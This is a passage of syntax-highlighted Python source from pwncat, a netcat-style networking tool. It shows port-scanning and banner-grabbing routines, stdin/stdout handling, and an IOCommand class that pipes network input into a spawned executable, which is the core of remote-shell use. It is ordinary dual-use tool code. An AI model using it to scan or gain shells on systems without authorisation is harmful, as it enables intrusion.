        <span class="hljs-string">"""Retrieve the (version) banner from a network service."""</span>
        <span class="hljs-keyword">if</span> port <span class="hljs-keyword">in</span> self.BANNER_PAYLOADS:
            payloads = self.BANNER_PAYLOADS[port] + self.BANNER_PAYLOADS[<span
                            class="hljs-number">0</span>]
        <span class="hljs-keyword">else</span>:
            payloads = self.BANNER_PAYLOADS[<span class="hljs-number">0</span>]

        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:
            <span class="hljs-comment"># Break the loop on terminate signal</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner._getbanner: %s-%d"</span>, addr, port
                )
                <span class="hljs-keyword">return</span> (<span
                            class="hljs-literal">False</span>, <span
                            class="hljs-literal">None</span>)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> payload <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                    sock.send(self.__enc.encode(payload))
                    self.__log.debug(<span class="hljs-string">"%s:%d - payload sent: %s"</span>, addr, port, repr(payload))

                sock.settimeout(<span class="hljs-number">0.5</span>)
                banner = sock.recv(self.__sock_opts.bufsize)
                version = self.__get_banner_version(self.__enc.decode(banner))
                self.__log.debug(<span class="hljs-string">"%s:%d - respone received: %s"</span>, addr, port, repr(banner))
                <span class="hljs-keyword">return</span> (<span class="hljs-literal">True</span>, version)
            <span class="hljs-keyword">except</span> socket.timeout:
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">except</span> (OSError, socket.error):
                <span class="hljs-keyword">return</span> (<span
                            class="hljs-literal">False</span>, <span
                            class="hljs-literal">None</span>)
        <span class="hljs-keyword">return</span> (<span class="hljs-literal">True</span>, <span
                            class="hljs-literal">None</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Port scanner yielding open/closed string for given port.

        Args:
            args: additional arguments.
            kwargs: additional arguments.

        Yields:
            str: Open/closed state (optionally with banner) from a port.
        """</span>
        port = args[<span class="hljs-number">0</span>]

        <span class="hljs-comment"># Loop over adress families</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__targets:

            <span class="hljs-comment"># [1/7] Check for termination request</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner.producer"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">return</span>

            addr = self.__targets[family]

            <span class="hljs-comment"># [2/7] Get socket</span>
            <span class="hljs-keyword">try</span>:
                sock = self.__get_socket(family)
                sock_type = sock.type
            <span class="hljs-keyword">except</span> (AttributeError, socket.error):
                <span class="hljs-comment"># Exception is triggered due to stop stignal and we</span>
                <span class="hljs-comment"># will abort here in that case.</span>
                <span class="hljs-keyword">return</span>

            <span class="hljs-comment"># [3/7] Connect scan</span>
            <span class="hljs-keyword">try</span>:
                laddr, lport = self.__sock.connect(
                    sock,
                    addr,
                    port,
                    <span class="hljs-literal">None</span>,
                    <span class="hljs-literal">None</span>,
                    <span class="hljs-literal">True</span>,
                    self.__enc.encode(<span class="hljs-string">"\0"</span>),
                    self.__sock_opts.bufsize,
                    <span class="hljs-number">0.1</span>,
                )
                <span class="hljs-comment"># Append local binds (addr-port) to check against during port scan</span>
                key = str(laddr + <span class="hljs-string">"-"</span> + str(lport))
                self.__local_binds[key] = sock
            <span class="hljs-keyword">except</span> socket.error:
                self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># [4/7] False positives</span>
            <span class="hljs-comment"># Connect was successful, but against a local bind of one of our</span>
            <span class="hljs-comment"># port scanners, so this is a false positive.</span>
            <span class="hljs-keyword">if</span> str(addr + <span class="hljs-string">"-"</span> + str(port)) <span
                            class="hljs-keyword">in</span> self.__local_binds:
                self.__sock.close(sock, <span class="hljs-string">"[-] closed: {}:{}"</span>.format(addr, port))
                <span class="hljs-keyword">del</span> self.__local_binds[key]
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># [5/7] Banner grabbing</span>
            succ_banner = <span class="hljs-literal">True</span>
            banner = <span class="hljs-literal">None</span>
            <span class="hljs-keyword">if</span> self.__banner:
                (succ_banner, banner) = self.__get_banner(sock, addr, port)

            <span class="hljs-comment"># [6/7] Evaluation</span>
            <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> succ_banner:
                msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({}): {}"</span>.format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                    banner,
                )
                <span class="hljs-keyword">yield</span> self.__enc.encode(msg)
            <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> succ_banner:
                msg = <span class="hljs-string">"[+] {:&gt;5}/{} open   ({})"</span>.format(
                    port,
                    self.__sock.get_type_name(sock_type),
                    self.__sock.get_family_name(family),
                )
                <span class="hljs-keyword">yield</span> self.__enc.encode(msg)

            <span class="hljs-comment"># [7/7] Cleanup</span>
            self.__sock.close(sock, key)
            <span class="hljs-keyword">del</span> self.__local_binds[key]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Print received data to stdout."""</span>
        <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
        <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
        <span class="hljs-keyword">with</span> self.__screen_lock:
            print(StringEncoder.decode(data))
            <span class="hljs-keyword">try</span>:
                sys.stdout.flush()
            <span class="hljs-keyword">except</span> IOError:
                <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
                <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
                devnull = os.open(os.devnull, os.O_WRONLY)
                os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span class="hljs-string">"SOCK-QUIT signal RAISED in IONetworkScanner.interrupt"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
        self.ssig.raise_sock_quit()

        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Closing up to 65535 sockets (single thread) takes very very long</span>
        <span class="hljs-comment"># Se we leave this up to Python itself, once the program exits.</span>
        <span class="hljs-comment"># self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore</span>
        <span class="hljs-comment"># # Double loop to prevent: Dictionary size changed during iteration</span>
        <span class="hljs-comment"># remove = {}</span>
        <span class="hljs-comment"># for key in self.__local_binds:</span>
        <span class="hljs-comment">#     remove[key] = self.__local_binds[key]</span>
        <span class="hljs-comment"># for key in remove:</span>
        <span class="hljs-comment">#     self.__sock.close(remove[key], key)</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [6/11 IOStdinStdout]: (4/5) IOStdinStdout</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IOStdinStdout</span>(<span
        class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Implement basic stdin/stdout I/O module.

    This I/O module provides a generator which continuously reads from stdin
    (non-blocking on POSIX and blocking on Windows) as well as a
    callback that writes to stdout.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, opts</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, DsIOStdinStdout) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance.
            opts (DsIOStdinStdout): IO options.
        """</span>
        super(IOStdinStdout, self).__init__(ssig)
        self.__opts = opts
        self.__py3 = sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                            class="hljs-number">0</span>)  <span
                            class="hljs-comment"># type: bool</span>
        self.__win = os.name != <span class="hljs-string">"posix"</span>  <span
                            class="hljs-comment"># posix or nt</span>
        self.__stdout_isatty = sys.stdout.isatty()
        self.__stdin_isatty = sys.stdin.isatty()

        self.log.debug(<span class="hljs-string">"STDOUT isatty: %s"</span>, self.__stdout_isatty)
        self.log.debug(<span class="hljs-string">"STDIN  isatty: %s"</span>, self.__stdin_isatty)
        self.log.debug(<span class="hljs-string">"STDIN  posix:  %s (%s)"</span>, str(self.__win), os.name)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Constantly ask for user input.

        Yields:
            str: Data read from stdin.
        """</span>
        <span class="hljs-comment"># On --send-on-eof we will return all of its contents at once:</span>
        lines = []

        <span class="hljs-comment"># https://stackoverflow.com/questions/1450393/#38670261</span>
        <span class="hljs-comment"># while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)</span>
        <span class="hljs-comment"># for line in sys.stdin.readlin():        &lt;- reads one byte at a time</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [1]"</span>
                )
                <span class="hljs-keyword">return</span>
            <span class="hljs-keyword">try</span>:
                data = self.__read_stdin()
            <span class="hljs-keyword">except</span> EOFError:
                <span class="hljs-comment"># When using select() with timeout, we don't have any input</span>
                <span class="hljs-comment"># at this point and simply continue the loop or quit if</span>
                <span class="hljs-comment"># a terminate request has been made by other threads.</span>
                <span class="hljs-keyword">if</span> self.ssig.has_stdin_quit():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"STDIN-QUIT signal ACK in IOStdinStdout.producer [2]"</span>
                    )
                    <span class="hljs-keyword">return</span>
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">if</span> data:
                self.log.debug(<span class="hljs-string">"Received %d bytes from STDIN"</span>, len(data))
                self.log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-comment"># [send-on-eof] Append data</span>
                <span class="hljs-keyword">if</span> self.__opts.send_on_eof:
                    lines.append(data)
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">yield</span> data
            <span class="hljs-comment"># EOF or &lt;Ctrl&gt;+&lt;d&gt;</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># [send-on-eof] Dump data before quitting</span>
                <span class="hljs-keyword">if</span> lines <span class="hljs-keyword">and</span> self.__opts.send_on_eof:
                    <span class="hljs-keyword">yield</span> StringEncoder.encode(<span
                            class="hljs-string">""</span>).join(lines)
                self.log.trace(<span class="hljs-string">"STDIN-EOF signal RAISE in IOStdinStdout.producer"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                self.ssig.raise_stdin_eof()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Print received data to stdout."""</span>
        <span class="hljs-keyword">if</span> self.__py3:
            sys.stdout.buffer.write(data)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
            <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
            <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
            print(data, end=<span class="hljs-string">""</span>)

        <span class="hljs-keyword">try</span>:
            sys.stdout.flush()
        <span class="hljs-keyword">except</span> IOError:
            <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
            <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Does not work on windows as it has blocking read of stdin</span>
        self.log.trace(<span class="hljs-string">"STDIN-QUIT signal RAISE in IOStdinStdout.interrupt"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
        self.ssig.raise_stdin_quit()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_input_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Throws a catchable EOFError exception for sys.stdin after timeout (Linux only)."""</span>
        <span class="hljs-comment"># rlist: wait until ready for reading</span>
        <span class="hljs-comment"># wlist: wait until ready for writing</span>
        <span class="hljs-comment"># xlist: wait for an exceptional condition</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> select.select([sys.stdin], [], [], self.__opts.input_timeout)[<span
                            class="hljs-number">0</span>]:
            <span class="hljs-keyword">raise</span> EOFError(<span
                            class="hljs-string">"timed out"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__stdin_israw</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Check if the terminal (STDIN) is set to raw mode."""</span>
        <span class="hljs-comment"># Non-posix systems (e.g. Windows) do not have a raw mode</span>
        <span class="hljs-keyword">if</span> self.__win:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        fild = sys.stdin.fileno()
        <span class="hljs-keyword">try</span>:
            mode = termios.tcgetattr(fild)
        <span class="hljs-keyword">except</span> termios.error:
            <span class="hljs-comment"># Not a TTY</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># ICANON</span>
        <span class="hljs-comment"># https://linux.die.net/man/3/termios</span>
        <span class="hljs-comment"># The setting of the ICANON canon flag in c_lflag determines whether</span>
        <span class="hljs-comment"># the terminal is operating in canonical mode (ICANON set) or</span>
        <span class="hljs-comment"># noncanonical (raw) mode (ICANON unset). By default, ICANON set.</span>
        <span class="hljs-keyword">return</span> mode[tty.LFLAG] != (mode[tty.LFLAG] | termios.ICANON)  <span
                            class="hljs-comment"># type: ignore</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__read_stdin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bytes</span>
        <span class="hljs-string">"""Returns input from STDIN."""</span>
        <span class="hljs-comment"># [1/3] (Windows) Normal/Raw mode</span>
        <span class="hljs-keyword">if</span> self.__win:
            <span class="hljs-keyword">if</span> self.__py3:
                <span class="hljs-keyword">return</span> sys.stdin.buffer.read()
            <span class="hljs-comment"># Python 2 on Windows opens sys.stdin in text mode, and</span>
            <span class="hljs-comment"># binary data that read from it becomes corrupted on \r\n.</span>
            <span class="hljs-comment"># Setting sys.stdin to binary mode fixes that.</span>
            <span class="hljs-keyword">if</span> hasattr(os, <span
                            class="hljs-string">"O_BINARY"</span>):
                msvcrt.setmode(  <span class="hljs-comment"># type: ignore</span>
                    sys.stdin.fileno(),
                    os.O_BINARY,  <span class="hljs-comment"># pylint: disable=no-member</span>
                )
            <span class="hljs-keyword">return</span> sys.stdin.read()  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># [2/3] (Linux/Mac) Raw mode</span>
        <span class="hljs-keyword">if</span> self.__stdin_israw():
            <span class="hljs-comment"># Issue #109</span>
            <span class="hljs-comment"># when pasting in term I donot get full line echo</span>
            <span class="hljs-comment"># To mitigate this, I'm disabling the select.select call on sys.stdin</span>
            <span class="hljs-comment"># self.__set_input_timeout()</span>
            <span class="hljs-keyword">if</span> self.__py3:
                <span class="hljs-keyword">return</span> sys.stdin.buffer.read(<span
                            class="hljs-number">1</span>)
            <span class="hljs-keyword">return</span> sys.stdin.read(<span
                            class="hljs-number">1</span>)  <span
                            class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># [3/3] (Linux/Mac) Normal mode</span>
        self.__set_input_timeout()
        <span class="hljs-keyword">if</span> self.__py3:
            <span class="hljs-keyword">return</span> sys.stdin.buffer.readline()
        <span class="hljs-keyword">return</span> sys.stdin.readline()  <span class="hljs-comment"># type: ignore</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [6/11 IOCommand]: (5/5) IOCommand</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">IOCommand</span>(<span class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Implement command execution functionality.

    Attributes:
        proc (subprocess.Popen): subprocess.Popen instance.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, opts</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, DsIOCommand) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            opts (DsIOCommand): Custom module options.
        """</span>
        super(IOCommand, self).__init__(ssig)
        self.__opts = opts
        self.log.debug(<span class="hljs-string">"Setting '%s' as executable"</span>, self.__opts.executable)

        <span class="hljs-comment"># Did we already run cleanup</span>
        self.__cleaned_up = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># If we receive only one byte at a time, the remote end is most likely</span>
        <span class="hljs-comment"># in raw mode and we will also start sending one byte at a time.</span>
        <span class="hljs-comment"># This will be determined in the consumer and action is taken in</span>
        <span class="hljs-comment"># the producer.</span>
        self.__remote_is_raw = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Open executable to wait for commands</span>
        env = os.environ.copy()
        <span class="hljs-keyword">try</span>:
            self.proc = Popen(  <span
                            class="hljs-comment"># pylint: disable=consider-using-with</span>
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=<span class="hljs-literal">False</span>,
                env=env,
            )
        <span class="hljs-keyword">except</span> FileNotFoundError:
            self.log.error(<span class="hljs-string">"Specified executable '%s' not found"</span>, self.__opts.executable)
            sys.exit(<span class="hljs-number">1</span>)
        <span class="hljs-comment"># Python-2 compat (doesn't have FileNotFoundError)</span>
        <span class="hljs-keyword">except</span> OSError:
            self.log.error(<span class="hljs-string">"Specified executable '%s' not found"</span>, self.__opts.executable)
            sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Constantly ask for input.

        Yields:
            str: Data received from command output.
        """</span>
        <span class="hljs-keyword">assert</span> self.proc.stdout <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
                self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (1)"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            self.log.trace(<span class="hljs-string">"Reading command output"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-comment"># Byte-wise reading is required to make it work for remote ends being in raw mode</span>
            <span class="hljs-comment"># However, the performance of self.proc.stdout.readline() is way faster.</span>
            <span class="hljs-comment"># To improve performance we will get rid of all other logging calls here.</span>
            <span class="hljs-keyword">if</span> self.__remote_is_raw:
                data = self.proc.stdout.read(<span class="hljs-number">1</span>)
            <span class="hljs-keyword">else</span>:
                data = self.proc.stdout.readline()
            self.log.trace(<span class="hljs-string">"Command output: %s"</span>, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
                <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
                    self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (2)"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                    self.__cleanup()
                    <span class="hljs-keyword">return</span>
                <span class="hljs-comment"># This usually happens when sending a semicolon only to /bin/[ba]sh</span>
                <span class="hljs-comment"># which then responds with: /bin/sh: line 5: syntax error near unexpected token `;'</span>
                <span class="hljs-comment"># Afterwards the shell is corrupt and gone so we will restart it here.</span>
                self.log.error(<span class="hljs-string">"COMMAND-EOF restarting: %s"</span>, self.__opts.executable)
                self.proc = Popen(  <span
                            class="hljs-comment"># pylint: disable=consider-using-with</span>
                    self.__opts.executable,
                    stdin=PIPE,
                    stdout=PIPE,
                    stderr=STDOUT,
                    bufsize=self.__opts.bufsize,
                    shell=<span class="hljs-literal">False</span>,
                    env=os.environ.copy(),
                )
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">yield</span> data

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Send data received to stdin (command input).

        Args:
            data (str): Command to execute.
        """</span>
        <span class="hljs-comment"># If we only receive one byte at a time, also tell the consumer</span>
        <span class="hljs-comment"># to send one byte at a time immediately and not to wait for a full line.</span>
        <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">1</span>:
            self.__remote_is_raw = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            self.__remote_is_raw = <span class="hljs-literal">False</span>

        <span class="hljs-keyword">assert</span> self.proc.stdin <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
        self.log.trace(<span class="hljs-string">"Appending to stdin: %s"</span>, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">try</span>:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        <span class="hljs-keyword">except</span> BrokenPipeError:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span
                            class="hljs-string">"COMMAND-QUIT signal RAISED IOCommand.interrupt"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
        self.ssig.raise_command_quit()
        self.__cleanup()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__cleanup</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Cleanup function."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__cleaned_up:
            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"COMMAND-QUIT-CLEANUP: killing executable: %s with pid %d"</span>,
                self.__opts.executable,
                self.proc.pid,
            )
            self.proc.kill()
            self.__cleaned_up = <span class="hljs-literal">True</span>


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   7 / 11   P S E   S T O R E</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [7/11 PSE]: (1/1) PSEStore</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">PSEStore</span>(<span class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.

    The same instance of this class will be available to your send and receive scripts
    that allow you to exchange data or manipulate themselves. You even have access to the
    currently used instance of the networking class to manipulate the active socket.
    As well as to the logger and InterruptHandler instances.
    """</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">messages</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, List[bytes]]</span>
        <span class="hljs-string">"""`Dict[str, List[bytes]]`: Stores sent and received messages by its thread name."""</span>
        <span class="hljs-keyword">return</span> self.__messages

<span class="hljs-meta">    @messages.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">messages</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, List[bytes]]) -&gt; None</span>
        self.__messages = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">store</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`Any`: Custom data store to be used in PSE scripts to persist your data between calls."""</span>
        <span class="hljs-keyword">return</span> self.__store

<span class="hljs-meta">    @store.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">store</span>(<span class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (Any) -&gt; None</span>
        self.__store = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: Instance of InterruptHandler class."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[IONetwork]</span>
        <span class="hljs-string">"""`IONetwork`: List of active IONetwork instances (client or server)."""</span>
        <span class="hljs-keyword">return</span> self.__net

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`Logging.logger`: Instance of Logging.logger class."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, net</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, List[IONetwork]) -&gt; None</span>
        <span class="hljs-string">"""Instantiate the PSE class.

        Args:
            ssig (InterruptHandler): Instance InterruptHandler.
            net (IONetwork): Instance of the current network class to manipulate the socket.
        """</span>
        self.__messages = {}
        self.__store = <span class="hljs-literal">None</span>
        self.__ssig = ssig
        self.__net = net
        self.__log = logging.getLogger(__name__)


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   8 / 11   R U N N E R</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [8/11 IO RUNNER]: (1/2) InterruptHandler</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterruptHandler</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Pwncat interrupt handler.

    It allows all threads to raise various signal on certain actions,
